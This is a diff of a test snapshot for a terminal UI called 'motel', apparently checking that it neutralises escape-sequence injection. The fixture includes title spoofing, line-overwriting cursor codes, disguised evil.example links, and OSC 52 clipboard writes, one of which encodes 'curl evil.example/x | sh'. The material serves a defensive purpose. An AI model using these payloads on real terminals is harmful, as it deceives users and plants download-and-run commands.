@@ -7,7 +7,7 @@ error       start failed: \x1b[2J\x1b[H\x1b]0;motel: all healthy\x07probe 500 [r
 note        note [:::https://evil.example/tag]motel login[:::-] \x1b[5A\x1b[2K\x1b[10C
 phases      downloading 1.2s › extracting 0.8s › preparing 4.1s › starting 1.0s ✖
 exit        exit status 3 \u009b31m
-probe       500 from /login\x1b[5A\x1b[2K\x1b[10C[:::https://evil.example/tag]motel login[:::-], bo…
+probe       500 from "/login\x1b[5A\x1b[2K\x1b[10C[:::https://evil.example/tag]motel login[:::-]", …
               <h1>no such table</h1>\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07 [:::https://evil…
               second line \x1bPtmux;\x1b\x1b]52;c;Y3VybA==\x07\x1b\
 redacted    the box replaced the values of: SECRET[:::https://evil.example/tag]motel login[:::-]
@@ -27,4 +27,4 @@ title \x1b]0;motel: all healthy\x07 end
 urltag [:::https://evil.example/tag]motel login[:::-] end
 multi
 line
-↑↓ scroll  w wrap  p previous  n next  y json  c command  esc back  ? more
+↑↓ scroll  w wrap  p previous  n next  esc back  ? more
